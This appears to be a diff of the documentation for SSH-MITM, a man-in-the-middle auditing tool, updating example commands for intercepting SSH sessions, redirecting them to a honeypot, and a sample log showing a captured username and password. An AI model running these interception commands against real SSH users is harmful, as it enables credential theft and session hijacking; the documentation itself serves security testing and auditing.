@@ -96,7 +96,11 @@ SSH-MITM can redirect the session to a honeypot.
 
 .. code-block:: none
 
-    $ ssh-mitm server --remote-host 192.168.0.x:PORT --fallback-host user:password@honeypot:22
+    $ ssh-mitm server --remote-host 192.168.0.x \
+        --enable-auth-fallback \
+        --fallback-host HONEYPOT \
+        --fallback-username HONEYPOT_USER \
+        --fallback-password HONEYPOT_PASSWORD
 
 Connections are only redirected to the honeypot if no agent was forwarded after publickey authentication.
 All other connections are forwarded to the destination server and a full man in the middle attack is possible.
@@ -123,11 +127,11 @@ Example SSH-MITM session intercepting password authentication:
 
 .. code-block:: bash
 
-    $ ssh-mitm server --remote-host 192.168.0.x:PORT
+    $ ssh-mitm server --remote-host 192.168.0.x
     2021-09-02 09:51:35,354 [INFO]  starting SSH-MITM 0.5.13
     2021-09-02 09:51:38,590 [INFO]  connected client version: SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.3
     2021-09-02 09:51:48,629 [INFO]  Client connection established with parameters:
-        Remote Address: 127.0.0.1
+        Remote Address: 192.168.0.x
         Port: 22
         Username: testuser
         Password: secret
